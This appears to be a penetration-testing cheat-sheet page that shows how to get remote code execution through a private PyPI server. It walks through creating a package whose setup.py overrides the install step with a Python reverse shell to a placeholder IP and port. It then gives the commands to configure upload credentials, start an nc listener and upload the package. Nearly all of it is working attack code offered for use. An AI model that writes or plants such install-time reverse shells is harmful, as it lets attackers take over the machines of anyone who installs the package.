---
title: "Pypi"
date: 2024-7-19
tags: ["python", "pypi", "package", "rce"]
---

### Abuse #1: Remote Pypi Server

#### 1. Create files

<div>

```console
mkdir evil_package
```

```console
mkdir evil_package/evil_package
```

```console
cd evil_package
```

```console
touch README.md
```

```console
touch evil_package/__init__.py
```

```console
touch setup.cfg
```

```console
touch setup.py
```

</div>

#### 2. Replace setup.py

<div>

```console
#!/usr/bin/env python3

from setuptools.command.install import install
from setuptools import setup
import os
import socket
import subprocess

class Exploit(install):
    def run(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("<LOCAL_IP>",<LOCAL_PORT>)) # CHANGE HERE
        os.dup2(s.fileno(),0)
        os.dup2(s.fileno(),1)
        os.dup2(s.fileno(),2)
        p = subprocess.call(["/bin/sh", "-i"])

setup(name="evil_package",
      version="1.0.0",
      description="Evil Package",
      author="user",
      author_email="user@<DOMAIN>",
      url="http://<DOMAIN>",
      license="MIT",
      zip_safe=False,
      cmdclass={"install": Exploit})
```

</div>

#### 3. Create ~/.pypirc

<div>

```console
[distutils]
index-servers =
  <EXAMPLE>
[<EXAMPLE>]
repository: http://<TARGET_DOMAIN>
username: <USER>
password: <PASSWORD>
```

</div>

#### 4. Exploit

<div>

```console
# Open a nc listener
rlwrap nc -lvnp <LOCAL_PORT>
```

</div>

<br>

<div>

```console
# Create an archive
python3 setup.py sdist
```

```console
# Upload
python3 setup.py sdist upload -r <EXAMPLE>
```

</div>

<br>